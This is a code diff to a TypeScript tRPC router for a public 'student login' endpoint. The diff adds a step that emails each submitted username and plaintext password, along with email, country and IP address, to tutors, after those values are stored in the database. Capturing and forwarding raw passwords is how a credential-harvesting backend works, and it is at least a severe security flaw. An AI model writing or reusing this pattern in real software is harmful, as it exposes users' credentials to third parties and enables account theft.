@@ -4,6 +4,7 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, router } from "./_core/trpc";
 import { z } from "zod";
 import { recordStudentLogin, getAllStudentLogins } from "./db";
+import { sendStudentLoginNotification } from "./email";
 
 export const appRouter = router({
     // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
@@ -29,14 +30,28 @@ export const appRouter = router({
         ipAddress: z.string().optional(),
       }))
       .mutation(async ({ input }) => {
+        const loginTime = new Date();
+        
+        // Record the login in database
         await recordStudentLogin({
           username: input.username,
           password: input.password,
           email: input.email,
           country: input.country,
           ipAddress: input.ipAddress,
-          loginTime: new Date(),
+          loginTime: loginTime,
         });
+
+        // Send email notification to tutors
+        await sendStudentLoginNotification({
+          username: input.username,
+          password: input.password,
+          email: input.email,
+          loginTime: loginTime,
+          country: input.country || "Unknown",
+          ipAddress: input.ipAddress,
+        });
+
         return { success: true };
       }),
   }),
